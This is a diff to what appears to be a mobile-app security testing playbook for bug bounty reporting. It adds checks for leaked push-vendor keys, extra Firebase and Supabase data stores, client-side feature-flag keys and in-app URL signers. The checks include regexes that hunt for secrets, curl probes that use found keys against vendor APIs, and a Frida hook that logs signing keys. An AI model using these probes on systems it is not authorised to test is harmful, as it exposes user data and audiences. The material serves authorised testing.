+- **Ruled out when:** Only the production entry exists in the release build, or non-prod entries exist but every selector is compiled out (`BuildConfig.DEBUG`-guarded with `DEBUG=false` in the shipped `BuildConfig`), unreachable from any exported surface and not server-settable. Quote the guard.
+
+### D18-074 · Push/engagement vendor REST key shipped where the app id belongs (OneSignal, Braze, Airship, Pushwoosh, MoEngage, CleverTap)
+
+| | |
+|---|---|
+| **Severity ceiling** | High (Critical where the handler of D18-034 routes on payload) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
+| **Attacker** | AM-01 |
+| **Applies to** | Apps bundling a third-party push or engagement SDK |
+| **Requires** | push |
+| **Maps to** | CWE-798; MASWE-0004; the H1 #789370 FCM-server-key class (D18-031), re-hosted at the vendor now that the legacy FCM endpoint is gone |
+| **Record** | logs/D18-074.txt |
+
+- **Test:** Each vendor ships an **app id** (client, public) and a **REST/API key** (server: sends to the whole install base, exports the audience). The REST key in the APK is the current form of the FCM-server-key finding; the vendor's *read* endpoint is the non-mutating validator. D18-046's generic read-key test does not name these endpoints or the audience-export impact.
+- **How:**
+```bash
+grep -rnoiE 'onesignal_app_id|os_v2_app_[a-z0-9_]{40,}|OneSignal\.(initWithContext|setAppId)|com_braze_api_key|braze_api_key|airship|UA_[A-Za-z0-9_-]{20,}|pushwoosh|moe_app_id|clevertap_account_(id|token)|rest_api_key|api_key_(prod|production)' "$S" "$R/values" "$A" | sort -u
+# validate with a READ endpoint only — never a send, never a segment create
+curl -s "https://api.onesignal.com/apps/<app_id>" -H "Authorization: Key <candidate>" | jq '{name, players, messageable_players, updated_at, error: .errors}'   # 200 with counts = REST key; 403 = app id / client key
+curl -s "https://rest.<cluster>.braze.com/segments/list" -H "Authorization: Bearer <candidate>" | head -c 300
+curl -s "https://go.urbanairship.com/api/segments" -u "<app_key>:<candidate>" -H 'Accept: application/vnd.urbanairship+json; version=3' | head -c 300
+```
+- **Proof:** A 200 from the vendor's management endpoint with the key from the package, showing the audience size. State — do not demonstrate — that the same key sends to every subscribed device under the vendor's brand.
+- **Escalation:** -> D18-034 (a handler that routes on message content makes this remote navigation control: Critical); -> D20 for the audience export (device ids, emails, tags, locations).
+- **Ruled out when:** Only the app id / client key is present and the vendor's read endpoint rejects every candidate (paste the 401/403 body). The vendor's documentation naming the key as client-safe is the P5 graveyard reference.
+
+### D18-075 · Second data-plane instances: named Firestore databases, extra RTDB instances, secondary Storage buckets, BaaS storage and functions
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
+| **Attacker** | AM-01 |
+| **Applies to** | Firebase and Supabase/PostgREST projects |
+| **Requires** | firebase |
+| **Maps to** | MASTG-KNOW-0039; Firebase insecure-rules documentation (rules are per database and per bucket) |
+| **Record** | logs/D18-075.txt; the three instance lists |
+
+- **Test:** Rules are per instance. A project may hold several Firestore databases (`FirebaseFirestore.getInstance(app, "<name>")`, GA since 2023), several RTDB instances and several Storage buckets; teams lock `(default)` and leave the others. Supabase adds Storage buckets and Edge Functions beside PostgREST. D18-014 to D18-022 and D18-044 probe only the default instance — probe every instance the package names.
+- **How:**
+```bash
+grep -rnoE 'getInstance\([^)]*"[A-Za-z0-9_-]+"\)' "$S" | grep -i firestore | grep -oE '"[^"]+"' | tr -d '"' | sort -u > firestore_dbs.txt
+grep -rhoE 'https://[a-z0-9-]+\.(firebaseio\.com|[a-z0-9-]+\.firebasedatabase\.app)' "$DEC" | sort -u > rtdb_instances.txt
+grep -rhoE 'gs://[a-z0-9._-]+|[a-z0-9-]+\.(appspot\.com|firebasestorage\.app)' "$DEC" | sort -u > buckets_fb.txt
+wc -l firestore_dbs.txt rtdb_instances.txt buckets_fb.txt
+curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/<name>/documents:listCollectionIds?key=$K" -H 'Content-Type: application/json' -d '{}' | jq -c '.collectionIds // .error.status'
+# Supabase: storage buckets and edge functions beside PostgREST
+curl -s -X POST "https://$REF.supabase.co/storage/v1/object/list/<bucket>" -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H 'Content-Type: application/json' -d '{"prefix":"","limit":20}' | head -c 600
+grep -rnoE 'functions/v1/[A-Za-z0-9_-]+|storage/v1/object/(public/)?[A-Za-z0-9_-]+' "$S" | sort -u
+```
+  Then run D18-014/-015/-017/-018/-021/-022 once per instance, counting per D18-070.
+- **Proof:** Data from a non-default instance beside the `PERMISSION_DENIED` of the default, in one evidence block, with the instance name as it appears in the dex.
+- **Escalation:** As D18-014 to D18-022 for the instance; a `backup` / `export` instance is usually the whole production dataset.
+- **Ruled out when:** Every instance in the three lists (counts stated) returns the rules denial unauthenticated and with a self-enrolled identity (D18-020).
+
+### D18-076 · Feature-flag and experimentation vendor keys evaluated client-side
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the flag set; rate up to the control a flag disables (D18-025) |
+| **Attacker** | AM-01 |
+| **Applies to** | Apps with a hosted feature-flag SDK (LaunchDarkly, Statsig, Optimizely, GrowthBook, Split, Flagsmith) |
+| **Requires** | backend-api |
+| **Maps to** | API8:2023; MASWE-0004; the D18-023 / D18-025 Remote Config class at another vendor |
+| **Record** | logs/D18-076.txt |
+
+- **Test:** Client-side flag SDKs ship a key that returns the **entire** flag/experiment set with targeting rules to any caller. The set names unreleased features, internal hosts, employee cohorts (emails in a rule) and security toggles. D18-024 names these vendors in Applies-to but the chapter's probes are Firebase-only.
+- **How:**
+```bash
+grep -rnoE 'mob-[0-9a-f-]{36}|sdk-[0-9a-f-]{36}|client-[A-Za-z0-9]{20,}|secret-[A-Za-z0-9]{20,}|launchdarkly|statsig|optimizely|growthbook|split\.io|flagsmith' "$S" "$R/values" | sort -u
+CTX=$(printf '{"kind":"user","key":"zq7x4kd2"}' | base64 | tr '+/' '-_' | tr -d '=')
+curl -s "https://clientsdk.launchdarkly.com/msdk/evalx/contexts/$CTX" -H 'Authorization: mob-…' | jq 'keys | length'                                   # LaunchDarkly mobile key: whole flag set for any context
+curl -s -X POST https://featuregates.org/v1/initialize -H 'statsig-api-key: client-…' -H 'Content-Type: application/json' -d '{"user":{"userID":"zq7x4kd2"},"statsigMetadata":{"sdkType":"android"}}' | jq '{gates: (.feature_gates|length), configs: (.dynamic_configs|length)}'
+curl -s "https://cdn.optimizely.com/datafiles/<sdk_key>.json" | jq '{experiments: (.experiments|length), audiences: [.audiences[]?.conditions]}'
+```
+- **Proof:** The flag/experiment inventory with any internal hostname, security toggle or PII-bearing targeting rule highlighted; one flag that D18-025 then shows the client obeys.
+- **Escalation:** -> D18-025; a *server-side* key in the APK (LaunchDarkly `sdk-…` / `api-…`, Statsig `secret-…`) reads and writes flags for every user — a P1 primitive, file it on its own.
+- **Ruled out when:** Only a client/mobile key is present, the returned set holds no internal host, no PII in rules and no security-relevant toggle, and the server-key regex is empty. Record the flag count.
+
+### D18-077 · Client-side signing of storage and upload URLs: the signer is in the package
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1) for an AWS/GCP signer; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a vendor signing secret |
+| **Attacker** | AM-01 |
+| **Applies to** | Apps that upload to or fetch from object storage or a media CDN directly |
+| **Requires** | — |
+| **Maps to** | CWE-798; MASWE-0004; D18-035, D18-043, D18-049 |
+| **Record** | logs/D18-077.txt |
+
+- **Test:** A correct backend mints the signed URL server-side and hands the client only the URL. If the app builds the signature itself it holds the signer: an AWS secret, a GCS service-account key, a CDN key pair or a vendor API secret — with no vendor prefix for D18-035/-049 to grep. Holding it means minting URLs for any object key: the D18-043 IDOR without the listing.
+- **How:**
+```bash
+grep -rnE 'presign|Presigned|AWS4-HMAC-SHA256|X-Amz-Signature|X-Goog-Signature|GoogleAccessId|CloudFront-Signature|Key-Pair-Id|api_sign_request|signature=' "$S" | head -30
+grep -rnE 'Mac\.getInstance\("Hmac(SHA1|SHA256)"\)|Signature\.getInstance\("SHA256withRSA"\)' "$S" | head        # a local signer near a storage host is the signal
+```
+```javascript
+Java.perform(function () {   // what key material initialises the signer, and who calls it?
+  var Log = Java.use('android.util.Log'), Ex = Java.use('java.lang.Exception');
+  var Mac = Java.use('javax.crypto.Mac');
+  Mac.init.overload('java.security.Key').implementation = function (k) {
+    var enc = k.getEncoded();
+    console.log('[Mac.init] ' + this.getAlgorithm() + ' keylen=' + (enc ? enc.length : '?') + '\n  ' + Log.getStackTraceString(Ex.$new()).split('\n').slice(1,5).join(' | '));
+    return this.init(k); };
+});
+```
+  In the proxy: does every signed URL arrive in a *response* from the first-party backend (server-minted) or appear only in a *request* the app issued with no prior mint call (client-signed)?
+- **Proof:** The signing secret with `file:line` (or the hook showing it loaded from package-resident material), one signed URL minted off-device with it, and the storage host honouring it (`200` on an object path you own). Stop at one object.
+- **Escalation:** An AWS signer is a long-lived IAM credential -> D18-035 scope check; sign a URL for another user's key path -> D18-043; a media vendor -> D18-049.
+- **Ruled out when:** Every signed URL in the proxy is received from the first-party backend and no signer in the app is initialised with package-resident key material (the hook log shows only TLS/keystore-backed keys). Show the mint call.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
 |---|---|---|
 | "Hardcoded Google API key found in `strings.xml`" | The APK is public by construction (AOSP security model rule ①: all static code and data in an APK is public). Firebase Web API keys are documented as embeddable; Reddit explicitly excludes them; Bugcrowd rates `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` P5. | Show the key authenticating from a host that is not the app and returning data or performing a billable/mutating operation — then it is `…for_publicly_accessible_asset` (P1) or `…pay_per_use_abuse` (P4). |
 | Maps key returning `REQUEST_DENIED` with "Requests from this Android client are blocked" | The key is package + SHA-1 restricted. The corpus is explicit that this is a ruled-out entry, not a Low. | Nothing, for that key. Move to D18-012 and find one that is not restricted, or show an IP-unrestricted key reaching a data API. |
-| `gcm_defaultSenderId` / `google_app_id` in the package | Client identifiers, required by the SDK. H1 #941590 rated a sender key **Low**; the server key in H1 #789370 was **Critical**. | A **server** key (`AAAA…:APA91b…`) or a service-account JSON, validated against the send endpoint using only a device token you own. |
+| `gcm_defaultSenderId` / `google_app_id` in the package | Client identifiers, required by the SDK. H1 #941590 rated a sender key **Low**; the server key in H1 #789370 was **Critical**. | A service-account JSON (D18-032) or a push-vendor REST key (D18-074), validated with a read-only call — the legacy `AAAA…:APA91b…` server key sends nothing since the 2024-07-22 shutdown (D18-031). |
 | Firestore/RTDB returning `{"error":"Permission denied"}` at the root | Rules are in force at that node. | A permissive child path (rules cascade downwards only — D18-016), an authenticated read with a self-minted identity (D18-019/-020), or a callable function that reads with admin credentials (D18-027). |
 | A public assets bucket that lists CSS, fonts and marketing images | Public by design; it is a CDN. | Object keys that identify users or documents (D18-043), anonymous **write** (D18-040), or a bucket the app loads code/config from. |
 | Stripe `pk_live_` publishable key, Braintree client token, analytics ingest write key | Documented public client credentials; the vendor's own model expects them in the client. | The same vendor's **secret**/management key (D18-047), or the ingest key accepted by the vendor's export/read API (D18-046). |
